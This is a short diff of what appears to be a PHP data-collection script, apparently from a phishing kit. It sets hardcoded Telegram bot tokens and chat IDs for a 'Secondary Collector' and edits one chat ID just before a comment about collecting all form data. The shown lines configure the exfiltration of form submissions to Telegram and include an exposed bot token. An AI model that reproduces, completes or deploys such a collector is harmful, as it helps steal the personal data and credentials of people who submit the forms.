@@ -9,7 +9,7 @@ $chat_id_1 = "8568458304";
 
 // BOT 2 — Secondary Collector  
 $telegram_token_2 = "8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk";
-$chat_id_2 = "-1003939463376";
+$chat_id_2 = "1003939463376";
 
 // ============================================
 // Collect all form data
